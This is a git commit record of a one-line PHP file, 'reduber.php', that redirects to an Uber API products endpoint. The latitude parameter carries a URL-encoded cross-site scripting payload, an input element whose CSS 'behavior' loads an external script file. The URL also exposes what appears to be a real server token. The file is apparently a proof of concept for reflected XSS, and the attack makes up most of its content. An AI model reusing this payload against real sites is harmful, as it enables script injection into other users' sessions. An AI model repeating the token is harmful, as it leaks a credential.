2585b1d2c070017769055de0defa6babd7eb3e1a
missoum1307 <missoum1307@users.noreply.github.com>
2017-12-22 12:44:09 +0100

    Update reduber.php

--- reduber.php
+++ reduber.php
@@ -1,1 +1,1 @@
-<?php header('location: https://api.uber.com/v1/products?server_token=r3IFxM3lubYxjEIgBa2Z_3JQm8QnWdZYYPr2cW3t&latitude=aaaa%3Cinput%20style=%27behavior:%20url(xss.htc)%27%3E')?>
+<?php header('location: https://api.uber.com/v1/products?server_token=r3IFxM3lubYxjEIgBa2Z_3JQm8QnWdZYYPr2cW3t&latitude=%3Cinput%20style=%27behavior:%20url(xss.txt)%27%3E')?>
